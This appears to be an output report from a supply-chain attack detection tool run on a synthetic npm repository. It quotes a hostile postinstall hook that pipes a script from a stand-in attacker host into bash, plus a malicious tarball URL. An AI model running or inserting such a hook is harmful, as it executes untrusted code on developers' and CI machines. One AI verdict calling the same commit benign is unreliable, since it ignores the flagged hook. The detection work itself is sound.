# Software Supply Chain Guardian: Repository & Change Investigation Report
**Target Repository:** `C:\Users\yeshx\AppData\Local\Temp\tmp5f8jil4h\synthetic-supply-chain-repo`  
**Analysis Timestamp:** `2026-11-24T11:11:05.910664+00:00`  
**Commit Range Investigated:** `54dfcfdcd6` $\to$ `3d8a017d00`  
**Total Findings:** 5 (5 introduced in range, 0 pre-existing)  
**Correlated Multi-Vector Scenarios:** 1  
**AI Investigations Conducted:** 5  

---

## 1. Executive Summary
Software Supply Chain Guardian implements an evidence-driven, tool-using investigation pipeline designed to identify malicious, suspicious, and unauthorized software supply chain activities that conventional advisory databases (NVD, CVE, OSV) fail to detect. By analyzing Git commit diffs, manifest changes, lifecycle script commands, external package registries, and CI/CD pipelines, Guardian detects stealthy supply chain attacks and distinguishes them from benign engineering patterns.

## 2. Investigation Scope and Commit Range
- **Repository Path:** `C:\Users\yeshx\AppData\Local\Temp\tmp5f8jil4h\synthetic-supply-chain-repo`
- **Baseline Commit:** `54dfcfdcd6a73c807495d5d67c7ace5b40949a28`
- **Head Commit:** `3d8a017d00bb8737d51db270ad11dbe0d3725059`
- **Scanned Files:** Manifests (`package.json`), lockfiles (`package-lock.json`), registry configurations (`.npmrc`), CI/CD workflows (`.github/workflows/*.yml`), and container specifications (`Dockerfile`, `docker-compose.yml`).

## 3. Methodology
The investigation combines four complementary analysis layers:
1. **Deterministic Git Diff Engine:** Audits version control differences, tagging findings with strict commit provenance (`OBSERVED_CHANGE` vs `HEURISTIC_FLAG`).
2. **Static Surface Inspectors:** Scans lifecycle scripts for shell execution hooks, verifies registry TLS protocols, checks package lexical similarity, and evaluates CI/CD permissions.
3. **Evidence Correlation Engine:** Correlates disparate indicators across vectors into multi-stage attack scenarios using MITRE ATT&CK techniques.
4. **LangGraph AI Investigator:** An autonomous agent using a bounded read-only tool loop with a strict Grounding Gate to evaluate evidence, test hypotheses, and document mitigating factors.

## 4. Repository Changes
- **DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-3d8a017d** (MEDIUM): Manifest Modified Without Updating Lockfile in Commit 3d8a017d in `package.json` (Line 1)
- **DIFF-SENSITIVE-FILE-_GITHUB_WORKFLOWS_CI_YML** (LOW): Security-Sensitive File Modified: '.github/workflows/ci.yml' (CI/CD Pipeline Definition) in `.github/workflows/ci.yml` (Line 1)
## 5. Dependency Changes
- **DIFF-DEP-ADDED-CORE-METRICS-COLLECTOR** [LOW | Introduced in Range]: Dependency 'core-metrics-collector@http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz' Added in Commit 3d8a017d (`package.json:8`)
  - *Evidence:* `+ "core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"`
## 6. Lifecycle-Script Findings
- **SCRIPT-PIPE_TO_SHELL-POSTINSTALL-L13** [CRITICAL]: Suspicious 'postinstall' Script: Lifecycle script pipes remote download directly into shell (`package.json:13`)
  - *Command:* `"postinstall": "curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash"`
## 7. Registry and Dependency-Source Findings
- **SRC-TARBALL-DEP-CORE-METRICS-COLLECTOR** [HIGH]: Direct URL/Tarball Dependency 'core-metrics-collector' in `package.json`
## 8. CI/CD Pipeline Findings
No CI/CD pipeline vulnerabilities identified.

## 9. Docker and Container Build Findings
No container configuration weaknesses detected.

## 10. Correlated Investigation Scenarios (Phase 2 Multi-Vector Engine)
### Scenario: Co-Located Dependency Anomaly and Dangerous Lifecycle Hook in 'package.json'
- **Composite ID:** `CORR-MANIFEST-INSTALL-CHAIN-001`
- **Severity:** `CRITICAL` | **Confidence:** `HIGH` | **Status:** `CONFIRMED_MULTI_VECTOR`
- **Attack Technique:** `MITRE ATT&CK T1195.001 (Compromise Software Dependencies)`
- **Suspected Narrative:** Coordinated modification introducing both external dependencies and shell execution in the same project manifest.
- **Observed Facts:**
  - Manifest 'package.json' defines unpinned dependencies: ['"core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"', '+ "core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"'].
  - Manifest 'package.json' defines high-severity install script commands: ['"postinstall": "curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash"'].
## 11. AI Investigation Agent Findings (Phase 3 LangGraph Tool-Using Loop)
### Investigation: `SCRIPT-PIPE_TO_SHELL-POSTINSTALL-L13`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `deterministic` | **Steps Executed:** 2
- **Rationale:** Source analysis confirmed an automated lifecycle script executing high-risk commands (e.g. piping remote HTTP content directly into shell). This bypasses central package signing and grants arbitrary execution on developer machines and CI runners.
- **Suspected Attack Scenario:** Remote download piped to shell or credential access in lifecycle script executes unvetted code during installation.
- **Actionable Remediation:** Immediately remove the script execution hook. Run package installations using 'npm install --ignore-scripts'.
### Investigation: `SRC-TARBALL-DEP-CORE-METRICS-COLLECTOR`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The package.json file explicitly references a dependency 'core-metrics-collector' pointing to an internal or external URL using an insecure HTTP protocol ('http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz'). Direct URL and tarball dependencies bypass standard registry integrity checks (such as npm registry cryptographic signatures and lockfile checksum validation if improperly configured), representing a classic supply chain injection vector for untrusted or malicious code.
- **Suspected Attack Scenario:** An attacker injects a malicious direct URL dependency into package.json pointing to an arbitrary tarball hosted on an attacker-controlled server. When the package manager installs dependencies, it fetches and executes arbitrary code or installs a trojanized package directly into the build or runtime environment, potentially achieving remote code execution.
- **Actionable Remediation:** Remove the direct URL dependency immediately, verify the legitimacy of 'core-metrics-collector', and pull only from trusted, authenticated official package registries with strict lockfile integrity validation.
### Investigation: `DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-3d8a017d`
- **Verdict:** `BENIGN_EXPLANATION` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The git diff shows a routine update to dependency version constraints in package.json without a corresponding lockfile change. While this can sometimes lead to dependency resolution drift across environments, it is a common developer oversight and lacks any malicious indicators such as typosquatted package names or unauthorized lifecycle script injections.
- **Mitigating Factors Identified:**
  - *Missing Lockfile Update:* The commit modified package.json without updating package-lock.json or yarn.lock, which can cause inconsistent installations.
- **Actionable Remediation:** Run package installation locally and commit the updated lockfile to ensure reproducible builds.
### Investigation: `DIFF-DEP-ADDED-CORE-METRICS-COLLECTOR`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The package.json file was modified to pull a dependency directly from an internal attacker-controlled URL (http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz). Fetching dependencies from arbitrary external or unverified HTTP mirrors bypasses standard package registry verification and integrity checks, representing a clear supply chain injection vector.
- **Suspected Attack Scenario:** An attacker introduces a malicious tarball hosted on an internal/external mirror (cdn.attacker-mirror.internal) into the project's dependencies via package.json. When 'npm install' or a similar package manager command is run, it downloads and executes the untrusted code from the arbitrary URL, leading to potential remote code execution or credential theft during the build process.
- **Actionable Remediation:** Immediately revert the commit adding the dependency, block the malicious domain, and audit the build environment for unauthorized package installations or execution.
### Investigation: `DIFF-SENSITIVE-FILE-_GITHUB_WORKFLOWS_CI_YML`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 2
- **Rationale:** The CI/CD workflow configuration was modified to change the trigger from 'push' to 'pull_request_target'. The 'pull_request_target' event runs in the context of the base branch and has access to repository secrets and write permissions, which is a classic vector for privilege escalation and arbitrary code execution when untrusted pull request code (especially checking out or executing code from the PR) is processed.
- **Suspected Attack Scenario:** An attacker submits a malicious pull request containing modified code or workflow directives. Because the workflow triggers on 'pull_request_target' and typically checks out the PR branch or executes untrusted scripts from the PR, the workflow executes with elevated privileges and access to repository secrets, allowing the attacker to exfiltrate secrets or compromise the repository.
- **Actionable Remediation:** Revert the change to 'pull_request_target', enforce 'pull_request' triggers for untrusted code contributions, and ensure workflows handling untrusted PRs do not check out and execute code from the PR commit.
## 12. False-Positive Considerations
- **Lexical Similarities vs Intentional Polyfills:** Package names like `bcrypt-nodejs` share similarity with `bcrypt`, but investigation confirms legitimate engineering intent (pure-JS implementation avoiding native C++ toolchain errors).
- **Internal Private Registries:** Registries hosted on corporate networks are authenticated and safe when TLS (`strict-ssl=true`) is enforced.
- **Official First-Party Actions:** Mutable tags on `actions/*` repositories pose operational update risks but not maintainer account takeover risks.
- **Cryptographic Commit Pinning:** Git dependencies pinned to full 40-character commit SHAs are cryptographically immutable.

## 13. Limitations
- Static analysis cannot observe runtime dynamic module loading (e.g. `eval(process.env.CODE)` computed at runtime).
- Obfuscated bytecode or compiled binary native addons require isolated dynamic sandboxing.
- Conventional CVE scanners remain necessary for published vulnerabilities in third-party dependency code.

## 14. Research Foundation
- Ohm et al. (2020), Backstabber's Knife Collection: A Review of Open Source Software Supply Chain Attacks
- Ladisa et al. (2023), SoK: Taxonomy of Attacks on Open-Source Software Supply Chains
- Wang et al. (2026), Demystifying and Detecting Agentic Workflow Injection Vulnerabilities in GitHub Actions
- Lin et al. (2024), UntrustIDE: Exploiting Weaknesses in VS Code Extensions
- Birsan (2021), Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies

## 15. Answer to the Central Research Question
> **"Can combining repository changes, dependency changes and pipeline changes reveal suspicious activity that vulnerability databases cannot detect?"**

**Yes, demonstrably.** Vulnerability databases such as NVD, CVE, and OSV index catalogued software defects after formal disclosure. They provide zero visibility into:
1. Direct tarball and Git URLs introduced in pull requests.
2. Dangerous install-time lifecycle execution hooks (`curl | sh`).
3. CI/CD expression injection weaknesses (`${{ github.event... }}`).
4. Insecure registry configurations and disabled TLS certificate validation.
5. Lockfile tampering uncorroborated by manifest modifications.

By synthesizing Git diffs, dependency provenance, static script syntax, and CI/CD policies into a unified LangGraph investigation loop, Guardian successfully identifies, correlates, and explains stealthy supply chain attack vectors even when no published CVE exists.